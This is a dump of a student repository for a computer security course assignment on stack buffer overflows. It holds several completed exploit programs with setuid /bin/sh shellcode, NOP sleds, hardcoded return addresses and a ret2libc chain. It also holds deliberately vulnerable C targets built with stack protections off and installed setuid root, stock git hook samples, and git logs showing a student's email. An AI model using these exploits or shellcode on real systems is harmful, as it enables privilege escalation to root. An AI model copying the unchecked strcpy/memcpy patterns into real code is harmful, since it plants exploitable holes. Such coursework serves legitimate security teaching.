Error: Attempt to add a non-ASCII file name.

This can cause problems if you want to work with people on other platforms.

To be portable it is advisable to rename the file.

If you know what you are doing you can disable this check using:

  git config hooks.allownonascii true
EOF
	exit 1
fi

# If there are whitespace errors, print the offending file names and fail.
exec git diff-index --check --cached $against --

<END OF ./.git/hooks/pre-commit.sample>
<START OF ./.git/hooks/applypatch-msg.sample>
#!/bin/sh
#
# An example hook script to check the commit log message taken by
# applypatch from an e-mail message.
#
# The hook should exit with non-zero status after issuing an
# appropriate message if it wants to stop the commit.  The hook is
# allowed to edit the commit message file.
#
# To enable this hook, rename this file to "applypatch-msg".

. git-sh-setup
commitmsg="$(git rev-parse --git-path hooks/commit-msg)"
test -x "$commitmsg" && exec "$commitmsg" ${1+"$@"}
:

<END OF ./.git/hooks/applypatch-msg.sample>
<START OF ./.git/hooks/fsmonitor-watchman.sample>
#!/usr/bin/perl

use strict;
use warnings;
use IPC::Open2;

# An example hook script to integrate Watchman
# (https://facebook.github.io/watchman/) with git to speed up detecting
# new and modified files.
#
# The hook is passed a version (currently 2) and last update token
# formatted as a string and outputs to stdout a new update token and
# all files that have been modified since the update token. Paths must
# be relative to the root of the working tree and separated by a single NUL.
#
# To enable this hook, rename this file to "query-watchman" and set
# 'git config core.fsmonitor .git/hooks/query-watchman'
#
my ($version, $last_update_token) = @ARGV;

# Uncomment for debugging
# print STDERR "$0 $version $last_update_token\n";

# Check the hook interface version
if ($version ne 2) {
	die "Unsupported query-fsmonitor hook version '$version'.\n" .
	    "Falling back to scanning...\n";
}

my $git_work_tree = get_working_dir();

my $retry = 1;

my $json_pkg;
eval {
	require JSON::XS;
	$json_pkg = "JSON::XS";
	1;
} or do {
	require JSON::PP;
	$json_pkg = "JSON::PP";
};

launch_watchman();

sub launch_watchman {
	my $o = watchman_query();
	if (is_work_tree_watched($o)) {
		output_result($o->{clock}, @{$o->{files}});
	}
}

sub output_result {
	my ($clockid, @files) = @_;

	# Uncomment for debugging watchman output
	# open (my $fh, ">", ".git/watchman-output.out");
	# binmode $fh, ":utf8";
	# print $fh "$clockid\n@files\n";
	# close $fh;

	binmode STDOUT, ":utf8";
	print $clockid;
	print "\0";
	local $, = "\0";
	print @files;
}

sub watchman_clock {
	my $response = qx/watchman clock "$git_work_tree"/;
	die "Failed to get clock id on '$git_work_tree'.\n" .
		"Falling back to scanning...\n" if $? != 0;

	return $json_pkg->new->utf8->decode($response);
}

sub watchman_query {
	my $pid = open2(\*CHLD_OUT, \*CHLD_IN, 'watchman -j --no-pretty')
	or die "open2() failed: $!\n" .
	"Falling back to scanning...\n";

	# In the query expression below we're asking for names of files that
	# changed since $last_update_token but not from the .git folder.
	#
	# To accomplish this, we're using the "since" generator to use the
	# recency index to select candidate nodes and "fields" to limit the
	# output to file names only. Then we're using the "expression" term to
	# further constrain the results.
	if (substr($last_update_token, 0, 1) eq "c") {
		$last_update_token = "\"$last_update_token\"";
	}
	my $query = <<"	END";
		["query", "$git_work_tree", {
			"since": $last_update_token,
			"fields": ["name"],
			"expression": ["not", ["dirname", ".git"]]
		}]
	END

	# Uncomment for debugging the watchman query
	# open (my $fh, ">", ".git/watchman-query.json");
	# print $fh $query;
	# close $fh;

	print CHLD_IN $query;
	close CHLD_IN;
	my $response = do {local $/; <CHLD_OUT>};

	# Uncomment for debugging the watch response
	# open ($fh, ">", ".git/watchman-response.json");
	# print $fh $response;
	# close $fh;

	die "Watchman: command returned no output.\n" .
	"Falling back to scanning...\n" if $response eq "";
	die "Watchman: command returned invalid output: $response\n" .
	"Falling back to scanning...\n" unless $response =~ /^\{/;

	return $json_pkg->new->utf8->decode($response);
}

sub is_work_tree_watched {
	my ($output) = @_;
	my $error = $output->{error};
	if ($retry > 0 and $error and $error =~ m/unable to resolve root .* directory (.*) is not watched/) {
		$retry--;
		my $response = qx/watchman watch "$git_work_tree"/;
		die "Failed to make watchman watch '$git_work_tree'.\n" .
		    "Falling back to scanning...\n" if $? != 0;
		$output = $json_pkg->new->utf8->decode($response);
		$error = $output->{error};
		die "Watchman: $error.\n" .
		"Falling back to scanning...\n" if $error;

		# Uncomment for debugging watchman output
		# open (my $fh, ">", ".git/watchman-output.out");
		# close $fh;

		# Watchman will always return all files on the first query so
		# return the fast "everything is dirty" flag to git and do the
		# Watchman query just to get it over with now so we won't pay
		# the cost in git to look up each individual file.
		my $o = watchman_clock();
		$error = $output->{error};

		die "Watchman: $error.\n" .
		"Falling back to scanning...\n" if $error;

		output_result($o->{clock}, ("/"));
		$last_update_token = $o->{clock};

		eval { launch_watchman() };
		return 0;
	}

	die "Watchman: $error.\n" .
	"Falling back to scanning...\n" if $error;

	return 1;
}

sub get_working_dir {
	my $working_dir;
	if ($^O =~ 'msys' || $^O =~ 'cygwin') {
		$working_dir = Win32::GetCwd();
		$working_dir =~ tr/\\/\//;
	} else {
		require Cwd;
		$working_dir = Cwd::cwd();
	}

	return $working_dir;
}

<END OF ./.git/hooks/fsmonitor-watchman.sample>
<START OF ./.git/hooks/pre-receive.sample>
#!/bin/sh
#
# An example hook script to make use of push options.
# The example simply echoes all push options that start with 'echoback='
# and rejects all pushes when the "reject" push option is used.
#
# To enable this hook, rename this file to "pre-receive".

if test -n "$GIT_PUSH_OPTION_COUNT"
then
	i=0
	while test "$i" -lt "$GIT_PUSH_OPTION_COUNT"
	do
		eval "value=\$GIT_PUSH_OPTION_$i"
		case "$value" in
		echoback=*)
			echo "echo from the pre-receive-hook: ${value#*=}" >&2
			;;
		reject)
			exit 1
		esac
		i=$((i + 1))
	done
fi

<END OF ./.git/hooks/pre-receive.sample>
<START OF ./.git/hooks/prepare-commit-msg.sample>
#!/bin/sh
#
# An example hook script to prepare the commit log message.
# Called by "git commit" with the name of the file that has the
# commit message, followed by the description of the commit
# message's source.  The hook's purpose is to edit the commit
# message file.  If the hook fails with a non-zero status,
# the commit is aborted.
#
# To enable this hook, rename this file to "prepare-commit-msg".

# This hook includes three examples. The first one removes the
# "# Please enter the commit message..." help message.
#
# The second includes the output of "git diff --name-status -r"
# into the message, just before the "git status" output.  It is
# commented because it doesn't cope with --amend or with squashed
# commits.
#
# The third example adds a Signed-off-by line to the message, that can
# still be edited.  This is rarely a good idea.

COMMIT_MSG_FILE=$1
COMMIT_SOURCE=$2
SHA1=$3

/usr/bin/perl -i.bak -ne 'print unless(m/^. Please enter the commit message/..m/^#$/)' "$COMMIT_MSG_FILE"

# case "$COMMIT_SOURCE,$SHA1" in
#  ,|template,)
#    /usr/bin/perl -i.bak -pe '
#       print "\n" . `git diff --cached --name-status -r`
# 	 if /^#/ && $first++ == 0' "$COMMIT_MSG_FILE" ;;
#  *) ;;
# esac

# SOB=$(git var GIT_COMMITTER_IDENT | sed -n 's/^\(.*>\).*$/Signed-off-by: \1/p')
# git interpret-trailers --in-place --trailer "$SOB" "$COMMIT_MSG_FILE"
# if test -z "$COMMIT_SOURCE"
# then
#   /usr/bin/perl -i.bak -pe 'print "\n" if !$first_line++' "$COMMIT_MSG_FILE"
# fi

<END OF ./.git/hooks/prepare-commit-msg.sample>
<START OF ./.git/hooks/post-update.sample>
#!/bin/sh
#
# An example hook script to prepare a packed repository for use over
# dumb transports.
#
# To enable this hook, rename this file to "post-update".

exec git update-server-info

<END OF ./.git/hooks/post-update.sample>
<START OF ./.git/hooks/pre-merge-commit.sample>
#!/bin/sh
#
# An example hook script to verify what is about to be committed.
# Called by "git merge" with no arguments.  The hook should
# exit with non-zero status after issuing an appropriate message to
# stderr if it wants to stop the merge commit.
#
# To enable this hook, rename this file to "pre-merge-commit".

. git-sh-setup
test -x "$GIT_DIR/hooks/pre-commit" &&
        exec "$GIT_DIR/hooks/pre-commit"
:

<END OF ./.git/hooks/pre-merge-commit.sample>
<START OF ./.git/hooks/pre-applypatch.sample>
#!/bin/sh
#
# An example hook script to verify what is about to be committed
# by applypatch from an e-mail message.
#
# The hook should exit with non-zero status after issuing an
# appropriate message if it wants to stop the commit.
#
# To enable this hook, rename this file to "pre-applypatch".

. git-sh-setup
precommit="$(git rev-parse --git-path hooks/pre-commit)"
test -x "$precommit" && exec "$precommit" ${1+"$@"}
:

<END OF ./.git/hooks/pre-applypatch.sample>
<START OF ./.git/hooks/pre-push.sample>
#!/bin/sh

# An example hook script to verify what is about to be pushed.  Called by "git
# push" after it has checked the remote status, but before anything has been
# pushed.  If this script exits with a non-zero status nothing will be pushed.
#
# This hook is called with the following parameters:
#
# $1 -- Name of the remote to which the push is being done
# $2 -- URL to which the push is being done
#
# If pushing without using a named remote those arguments will be equal.
#
# Information about the commits which are being pushed is supplied as lines to
# the standard input in the form:
#
#   <local ref> <local sha1> <remote ref> <remote sha1>
#
# This sample shows how to prevent push of commits where the log message starts
# with "WIP" (work in progress).

remote="$1"
url="$2"

z40=0000000000000000000000000000000000000000

while read local_ref local_sha remote_ref remote_sha
do
	if [ "$local_sha" = $z40 ]
	then
		# Handle delete
		:
	else
		if [ "$remote_sha" = $z40 ]
		then
			# New branch, examine all commits
			range="$local_sha"
		else
			# Update to existing branch, examine new commits
			range="$remote_sha..$local_sha"
		fi

		# Check for WIP commit
		commit=`git rev-list -n 1 --grep '^WIP' "$range"`
		if [ -n "$commit" ]
		then
			echo >&2 "Found WIP commit in $local_ref, not pushing"
			exit 1
		fi
	fi
done

exit 0

<END OF ./.git/hooks/pre-push.sample>
<START OF ./.git/hooks/update.sample>
#!/bin/sh
#
# An example hook script to block unannotated tags from entering.
# Called by "git receive-pack" with arguments: refname sha1-old sha1-new
#
# To enable this hook, rename this file to "update".
#
# Config
# ------
# hooks.allowunannotated
#   This boolean sets whether unannotated tags will be allowed into the
#   repository.  By default they won't be.
# hooks.allowdeletetag
#   This boolean sets whether deleting tags will be allowed in the
#   repository.  By default they won't be.
# hooks.allowmodifytag
#   This boolean sets whether a tag may be modified after creation. By default
#   it won't be.
# hooks.allowdeletebranch
#   This boolean sets whether deleting branches will be allowed in the
#   repository.  By default they won't be.
# hooks.denycreatebranch
#   This boolean sets whether remotely creating branches will be denied
#   in the repository.  By default this is allowed.
#

# --- Command line
refname="$1"
oldrev="$2"
newrev="$3"

# --- Safety check
if [ -z "$GIT_DIR" ]; then
	echo "Don't run this script from the command line." >&2
	echo " (if you want, you could supply GIT_DIR then run" >&2
	echo "  $0 <ref> <oldrev> <newrev>)" >&2
	exit 1
fi

if [ -z "$refname" -o -z "$oldrev" -o -z "$newrev" ]; then
	echo "usage: $0 <ref> <oldrev> <newrev>" >&2
	exit 1
fi

# --- Config
allowunannotated=$(git config --type=bool hooks.allowunannotated)
allowdeletebranch=$(git config --type=bool hooks.allowdeletebranch)
denycreatebranch=$(git config --type=bool hooks.denycreatebranch)
allowdeletetag=$(git config --type=bool hooks.allowdeletetag)
allowmodifytag=$(git config --type=bool hooks.allowmodifytag)

# check for no description
projectdesc=$(sed -e '1q' "$GIT_DIR/description")
case "$projectdesc" in
"Unnamed repository"* | "")
	echo "*** Project description file hasn't been set" >&2
	exit 1
	;;
esac

# --- Check types
# if $newrev is 0000...0000, it's a commit to delete a ref.
zero="0000000000000000000000000000000000000000"
if [ "$newrev" = "$zero" ]; then
	newrev_type=delete
else
	newrev_type=$(git cat-file -t $newrev)
fi

case "$refname","$newrev_type" in
	refs/tags/*,commit)
		# un-annotated tag
		short_refname=${refname##refs/tags/}
		if [ "$allowunannotated" != "true" ]; then
			echo "*** The un-annotated tag, $short_refname, is not allowed in this repository" >&2
			echo "*** Use 'git tag [ -a | -s ]' for tags you want to propagate." >&2
			exit 1
		fi
		;;
	refs/tags/*,delete)
		# delete tag
		if [ "$allowdeletetag" != "true" ]; then
			echo "*** Deleting a tag is not allowed in this repository" >&2
			exit 1
		fi
		;;
	refs/tags/*,tag)
		# annotated tag
		if [ "$allowmodifytag" != "true" ] && git rev-parse $refname > /dev/null 2>&1
		then
			echo "*** Tag '$refname' already exists." >&2
			echo "*** Modifying a tag is not allowed in this repository." >&2
			exit 1
		fi
		;;
	refs/heads/*,commit)
		# branch
		if [ "$oldrev" = "$zero" -a "$denycreatebranch" = "true" ]; then
			echo "*** Creating a branch is not allowed in this repository" >&2
			exit 1
		fi
		;;
	refs/heads/*,delete)
		# delete branch
		if [ "$allowdeletebranch" != "true" ]; then
			echo "*** Deleting a branch is not allowed in this repository" >&2
			exit 1
		fi
		;;
	refs/remotes/*,commit)
		# tracking branch
		;;
	refs/remotes/*,delete)
		# delete tracking branch
		if [ "$allowdeletebranch" != "true" ]; then
			echo "*** Deleting a tracking branch is not allowed in this repository" >&2
			exit 1
		fi
		;;
	*)
		# Anything else (is there anything else?)
		echo "*** Update hook: unknown type of update to ref $refname of type $newrev_type" >&2
		exit 1
		;;
esac

# --- Finished
exit 0

<END OF ./.git/hooks/update.sample>
<START OF ./.git/refs/heads/main>
cb508fcc3161dd36de158d7f2fdc6934da4be6c5

<END OF ./.git/refs/heads/main>
<START OF ./.git/refs/remotes/origin/master>
5eef708ef223be75f74e68d36cedffcf5484f284

<END OF ./.git/refs/remotes/origin/master>
<START OF ./.git/refs/remotes/origin/main>
cb508fcc3161dd36de158d7f2fdc6934da4be6c5

<END OF ./.git/refs/remotes/origin/main>

<END OF ./repo.txt>
<START OF ./getCode.py>
import os

def append_file_contents_to_repo(start_dir, repo_file_path):
    """
    Recursively append the contents of all files in start_dir and its subdirectories
    to a single file specified by repo_file_path.
    """
    for root, dirs, files in os.walk(start_dir):
        for file in files:
            file_path = os.path.join(root, file)
            try:
                with open(file_path, 'r', encoding='utf-8') as f:
                    contents = f.read()
                with open(repo_file_path, 'a', encoding='utf-8') as repo:
                    repo.write(f"<START OF {file_path}>\n")
                    repo.write(contents)
                    repo.write(f"\n<END OF {file_path}>\n")
            except Exception as e:
                print(f"Failed to process {file_path}: {e}")

if __name__ == "__main__":
    repo_file = "repo.txt"
    start_directory = "."  # Current directory
    append_file_contents_to_repo(start_directory, repo_file)

<END OF ./getCode.py>
<START OF ./cs5435-hw4/README.txt>
CS5435 HW4

Included are two directories:

demo/
This contains the demo target meet.c. 

sploits/
This contains the starter code for your exploits. 

targets/
This contains the targets. You can build the targets by running "sudo make" in targets/. 
The resulting executables will be placed in /tmp/ with appropriate
permissions.



<END OF ./cs5435-hw4/README.txt>
<START OF ./cs5435-hw4/demo/get_sp.c>
#include <stdio.h>

unsigned long get_sp(void) 
{
	__asm__("movl %esp, %eax");
}

int main() 
{
	printf("Stack pointer (ESP): 0x%x\n", get_sp() );
}


<END OF ./cs5435-hw4/demo/get_sp.c>
<START OF ./cs5435-hw4/demo/meet.c>
#include <stdio.h>
#include <string.h>


void greeting( char* temp1 )
{
	char name[400];
	memset(name, 0, 400);
	strcpy(name, temp1);
	printf( "Hi %s \n", name );
}


int main(int argc, char* argv[] ) 
{
	greeting( argv[1] );
	printf( "Bye %s\n", argv[1] );
}

<END OF ./cs5435-hw4/demo/meet.c>
<START OF ./cs5435-hw4/demo/simpleargs.c>
#include <stdio.h>
#include <string.h>


greeting( int v1 )
{
	char name[400];
}


int main(int argc, char* argv[] ) 
{
	int p1;
	greeting( p1 );
}

<END OF ./cs5435-hw4/demo/simpleargs.c>
<START OF ./cs5435-hw4/sploits/sploit1.c>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target1"

int main(void)
{
  char *args[3];
  char *env[2];  

  char buf[32];
  memset(buf, 0x90, 32);
  strncpy(buf+10, shellcode, 22);
  
  uint32_t ret = 0xffffcfdc;

  env[0] = buf;  
  env[1] = NULL;

  args[0] = TARGET;
  args[1] = (char*)&ret;
  args[2] = NULL;
  
  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
<END OF ./cs5435-hw4/sploits/sploit1.c>
<START OF ./cs5435-hw4/sploits/sploitEC.c>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target4"
#define LIBC_BASE 0xf7de1000

int main(void)
{
  char *args[3];
  char *env[1];

  char buf[32];
  uint32_t *addr_ptr = (uint32_t *)(buf);

  *addr_ptr++ = LIBC_BASE + 0x000b8c30;
  *addr_ptr++ = 0;
  *addr_ptr++ = LIBC_BASE + 0x0002f7d0;
  *addr_ptr++ = 0;
  *addr_ptr++ = LIBC_BASE + 0x0015f294;
  
  args[0] = TARGET;
  args[1] = buf;
  args[2] = NULL;

  env[0] = NULL;

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
<END OF ./cs5435-hw4/sploits/sploitEC.c>
<START OF ./cs5435-hw4/sploits/sploit2.c>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target2"

int main(void)
{
  char *args[3];
  char *env[1]; 

  char buf[500];
  memset(buf, 0x90, 500);
  memcpy(buf+400, shellcode, sizeof(shellcode));

  uint32_t *addr_ptr = (uint32_t*)(buf + 488);
  *addr_ptr++ = 0xffffcf48;
  *addr_ptr++ = 0xffffcf48;
  *addr_ptr++ = 0xffffcf48;

  args[0] = TARGET;
  args[1] = buf;
  args[2] = "400";
  
  env[0] = NULL;

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
<END OF ./cs5435-hw4/sploits/sploit2.c>
<START OF ./cs5435-hw4/sploits/sploit3.c>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target3"

int main(void)
{
  char *args[3];
  char *env[1];

  char buf[256];
  int32_t *intvec = (int32_t*)buf;

  memset(buf, 0x90, 256);
  memcpy(buf+32, shellcode, sizeof(shellcode)); 

  intvec[16] = 0xffffcf88;
  intvec[17] = 0xffffcf88;
  intvec[18] = 0xffffcf88;
  intvec[19] = 0xffffcf88;
  intvec[20] = 0xffffcf88;

  args[0] = TARGET;
  args[1] = buf; 
  args[2] = NULL;

  env[0] = NULL;

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
<END OF ./cs5435-hw4/sploits/sploit3.c>
<START OF ./cs5435-hw4/sploits/shellcode.h>
static char shellcode[] = 
  "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\xa4\xb3\x1f\xb1\x1f\xb2\x1f"
  "\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c"
  "\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8"
  "\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh";

<END OF ./cs5435-hw4/sploits/shellcode.h>
<START OF ./cs5435-hw4/sploits/brute_force.py>

<END OF ./cs5435-hw4/sploits/brute_force.py>
<START OF ./cs5435-hw4/sploits/sploit0.c>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/srv/target0"

int main(void)
{
    char *args[3];
    char *env[1];

    char buf[424];
    memset(buf, 0x90, 424);
    memcpy(buf + 212, shellcode, sizeof(shellcode));

    uint32_t *addr_ptr = (uint32_t*)(buf + 412);
    *addr_ptr++ = 0xffffcf50;
    *addr_ptr++ = 0xffffcf50;
    *addr_ptr++ = 0xffffcf50;

    args[0] = TARGET;
    args[1] = buf;
    args[2] = NULL;

    env[0] = NULL;

    execve(TARGET, args, env);
    fprintf(stderr, "execve failed.\n");

    return 0;
}
<END OF ./cs5435-hw4/sploits/sploit0.c>
<START OF ./cs5435-hw4/sploits/sploit4.c>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target4"

int main(void)
{
  char *args[3];
  char *env[1];

  char buf[24];

  uint32_t *addr_ptr = (uint32_t *)(buf);
  
  *addr_ptr++ = 0xffffe420;
  *addr_ptr++ = 0xffffcff0;
  *addr_ptr++ = 0xffffcfe8;

  args[0] = TARGET;
  args[1] = buf;
  args[2] = NULL;

  env[0] = NULL;

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
<END OF ./cs5435-hw4/sploits/sploit4.c>
<START OF ./cs5435-hw4/targets/target2.c>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


void greeting( char* temp1, short input_size )
{
  char name[400];

  if( input_size != 399 ) 
  {
    fprintf(stderr, "Error: input_size not 399\n" );
    return;
  }
  strcpy(name, temp1);
  printf( "Hi %s\n", name );
}


int main(int argc, char* argv[] ) 
{
  int real_size = 0;
  int input_size = 0;

  if(argc != 3 )
  {
    fprintf(stderr, "meet: argc != 3\n");
    exit(EXIT_FAILURE);
  }

  real_size = strlen(argv[1]);
  input_size = atoi(argv[2]);
  if( real_size > input_size ) 
  {
    fprintf(stderr, "Error: real_size larger than input_size\n" );
    exit(EXIT_FAILURE);
  }

  greeting( argv[1], input_size );
  printf( "Bye %s\n", argv[1] );
  return 0;
}


<END OF ./cs5435-hw4/targets/target2.c>
<START OF ./cs5435-hw4/targets/Makefile>
CC := gcc
RM := rm -f
EXECSTACK := execstack

# flags
CFLAGSEXEC := -ggdb -mpreferred-stack-boundary=2 -zexecstack -fno-stack-protector -no-pie -fno-pie -m32 
CFLAGSNOEXEC := -ggdb -mpreferred-stack-boundary=2 -fno-stack-protector -no-pie -fno-pie -m32

# sources
sources := target0.c target1.c target2.c target3.c  target4.c
targets := target0 target1 target2 target3 target4

# gmake magic
.PHONY: all clean

#targets
all: 
	$(CC) $(CFLAGSEXEC) -o target0 target0.c
	$(CC) $(CFLAGSEXEC) -o target1 target1.c
	$(CC) $(CFLAGSEXEC) -o target2 target2.c
	$(CC) $(CFLAGSEXEC) -o target3 target3.c
	$(CC) $(CFLAGSNOEXEC) -o target4 target4.c
	install -o root -t /tmp $(targets)
	chmod 4755 /tmp/target*

clean:
	$(RM) $(targets) $(sources:.c=.o)

<END OF ./cs5435-hw4/targets/Makefile>
<START OF ./cs5435-hw4/targets/target1.c>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


void foo( char* temp )
{
  char name[4];

  strncpy(name, temp, 12);
}


int main(int argc, char* argv[] ) 
{
  if( argc != 2 )
  {
    fprintf(stderr, "meet: argc != 2\n");
    exit(EXIT_FAILURE);
  }

  foo( argv[1] );
  return 0;
}


<END OF ./cs5435-hw4/targets/target1.c>
<START OF ./cs5435-hw4/targets/Makefile-arm>
CC := arm-linux-gnueabi-gcc 
RM := rm -f
EXECSTACK := execstack

# flags
CFLAGSEXEC := -ggdb -zexecstack -fno-stack-protector -no-pie -fno-pie
CFLAGSNOEXEC := -fno-stack-protector -no-pie -fno-pie

# sources
sources := target0.c target1.c target2.c target3.c  target4.c
targets := target0 target1 target2 target3 target4

# gmake magic
.PHONY: all clean

#targets
all: 
	$(CC) $(CFLAGSEXEC) -o target0 target0.c
	$(CC) $(CFLAGSEXEC) -o target1 target1.c
	$(CC) $(CFLAGSEXEC) -o target2 target2.c
	$(CC) $(CFLAGSEXEC) -o target3 target3.c
	$(CC) $(CFLAGSNOEXEC) -o target4 target4.c
	install -o root -t /tmp $(targets)
	chmod 4755 /tmp/target*

clean:
	$(RM) $(targets) $(sources:.c=.o)

<END OF ./cs5435-hw4/targets/Makefile-arm>
<START OF ./cs5435-hw4/targets/target4.c>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


void foo( char* temp )
{
  char name[4];

  strcpy(name, temp);
}


int main(int argc, char* argv[] ) 
{
  if( argc != 2 )
  {
    fprintf(stderr, "meet: argc != 2\n");
    exit(EXIT_FAILURE);
  }

  foo( argv[1] );
  return 0;
}


<END OF ./cs5435-hw4/targets/target4.c>
<START OF ./cs5435-hw4/targets/target0.c>
#include <stdio.h>
#include <string.h>


void greeting( char* temp1 )
{
	char name[400];
	memset(name, 0, 400);
	strcpy(name, temp1);
	printf( "Hi %s\n", name );
}


int main(int argc, char* argv[] ) 
{
	greeting( argv[1] );
	printf( "Bye %s\n", argv[1] );
}

<END OF ./cs5435-hw4/targets/target0.c>
<START OF ./cs5435-hw4/targets/target3.c>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


void copyFourInts( char *values )
{  
  int intvalues[4];
  memcpy((char*)intvalues, values, sizeof(int)*5);
}

void foo( char* values )
{
  copyFourInts( values );
}

int main(int argc, char* argv[] ) 
{
  if( argc != 2 )
  {
    fprintf(stderr, "meet: argc != 2\n");
    exit(EXIT_FAILURE);
  }
  
  foo( argv[1] );
  return 0;
}


<END OF ./cs5435-hw4/targets/target3.c>
<START OF ./.git/config>
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
	ignorecase = true
	precomposeunicode = true
[remote "origin"]
	url = https://github.com/justinhalford/h4.git
	fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
	remote = origin
	merge = refs/heads/main
[branch "master"]
	remote = origin
	merge = refs/heads/master

<END OF ./.git/config>
<START OF ./.git/HEAD>
ref: refs/heads/master

<END OF ./.git/HEAD>
<START OF ./.git/description>
Unnamed repository; edit this file 'description' to name the repository.

<END OF ./.git/description>
<START OF ./.git/COMMIT_EDITMSG>
may 2 v2

<END OF ./.git/COMMIT_EDITMSG>
<START OF ./.git/info/exclude>
# git ls-files --others --exclude-from=.git/info/exclude
# Lines that start with '#' are comments.
# For a project mostly in C, the following would be a good set of
# exclude patterns (uncomment them if you want to use them):
# *.[oa]
# *~

<END OF ./.git/info/exclude>
<START OF ./.git/logs/HEAD>
0000000000000000000000000000000000000000 5eef708ef223be75f74e68d36cedffcf5484f284 justinhalford <justinhalford@gmail.com> 1712899418 -0400	commit (initial): Initial commit
5eef708ef223be75f74e68d36cedffcf5484f284 0000000000000000000000000000000000000000 justinhalford <justinhalford@gmail.com> 1712899479 -0400	Branch: renamed refs/heads/master to refs/heads/main
0000000000000000000000000000000000000000 5eef708ef223be75f74e68d36cedffcf5484f284 justinhalford <justinhalford@gmail.com> 1712899479 -0400	Branch: renamed refs/heads/master to refs/heads/main
5eef708ef223be75f74e68d36cedffcf5484f284 f8d27309725087299c0ae9fb6636d57984bed39c justinhalford <justinhalford@gmail.com> 1712902046 -0400	commit: Initial commit
f8d27309725087299c0ae9fb6636d57984bed39c cb508fcc3161dd36de158d7f2fdc6934da4be6c5 justinhalford <justinhalford@gmail.com> 1713753685 -0400	commit: Initial commit of project files
cb508fcc3161dd36de158d7f2fdc6934da4be6c5 dfee827ec55600fc073f826ec2c0ed764ed192ed justinhalford <justinhalford@gmail.com> 1714700344 -0400	commit: may 2
dfee827ec55600fc073f826ec2c0ed764ed192ed 8fe91943ed6def84c8a4a581ef70c7a8a2eac9a3 justinhalford <justinhalford@gmail.com> 1714701273 -0400	commit: may 2 v1
8fe91943ed6def84c8a4a581ef70c7a8a2eac9a3 8fe91943ed6def84c8a4a581ef70c7a8a2eac9a3 justinhalford <justinhalford@gmail.com> 1714701527 -0400	checkout: moving from main to master
8fe91943ed6def84c8a4a581ef70c7a8a2eac9a3 4861122ff0358bef3a46545443aa5146e2400256 justinhalford <justinhalford@gmail.com> 1714701929 -0400	commit: may 2 v2

<END OF ./.git/logs/HEAD>
<START OF ./.git/logs/refs/heads/master>
0000000000000000000000000000000000000000 8fe91943ed6def84c8a4a581ef70c7a8a2eac9a3 justinhalford <justinhalford@gmail.com> 1714701527 -0400	branch: Created from HEAD
8fe91943ed6def84c8a4a581ef70c7a8a2eac9a3 4861122ff0358bef3a46545443aa5146e2400256 justinhalford <justinhalford@gmail.com> 1714701929 -0400	commit: may 2 v2

<END OF ./.git/logs/refs/heads/master>
<START OF ./.git/logs/refs/heads/main>
0000000000000000000000000000000000000000 5eef708ef223be75f74e68d36cedffcf5484f284 justinhalford <justinhalford@gmail.com> 1712899418 -0400	commit (initial): Initial commit
5eef708ef223be75f74e68d36cedffcf5484f284 5eef708ef223be75f74e68d36cedffcf5484f284 justinhalford <justinhalford@gmail.com> 1712899479 -0400	Branch: renamed refs/heads/master to refs/heads/main
5eef708ef223be75f74e68d36cedffcf5484f284 f8d27309725087299c0ae9fb6636d57984bed39c justinhalford <justinhalford@gmail.com> 1712902046 -0400	commit: Initial commit
f8d27309725087299c0ae9fb6636d57984bed39c cb508fcc3161dd36de158d7f2fdc6934da4be6c5 justinhalford <justinhalford@gmail.com> 1713753685 -0400	commit: Initial commit of project files
cb508fcc3161dd36de158d7f2fdc6934da4be6c5 dfee827ec55600fc073f826ec2c0ed764ed192ed justinhalford <justinhalford@gmail.com> 1714700344 -0400	commit: may 2
dfee827ec55600fc073f826ec2c0ed764ed192ed 8fe91943ed6def84c8a4a581ef70c7a8a2eac9a3 justinhalford <justinhalford@gmail.com> 1714701273 -0400	commit: may 2 v1

<END OF ./.git/logs/refs/heads/main>
<START OF ./.git/logs/refs/remotes/origin/master>
0000000000000000000000000000000000000000 5eef708ef223be75f74e68d36cedffcf5484f284 justinhalford <justinhalford@gmail.com> 1712899467 -0400	update by push
5eef708ef223be75f74e68d36cedffcf5484f284 8fe91943ed6def84c8a4a581ef70c7a8a2eac9a3 justinhalford <justinhalford@gmail.com> 1714701559 -0400	update by push
8fe91943ed6def84c8a4a581ef70c7a8a2eac9a3 4861122ff0358bef3a46545443aa5146e2400256 justinhalford <justinhalford@gmail.com> 1714701936 -0400	update by push

<END OF ./.git/logs/refs/remotes/origin/master>
<START OF ./.git/logs/refs/remotes/origin/main>
0000000000000000000000000000000000000000 5eef708ef223be75f74e68d36cedffcf5484f284 justinhalford <justinhalford@gmail.com> 1712899483 -0400	update by push
5eef708ef223be75f74e68d36cedffcf5484f284 f8d27309725087299c0ae9fb6636d57984bed39c justinhalford <justinhalford@gmail.com> 1712902050 -0400	update by push
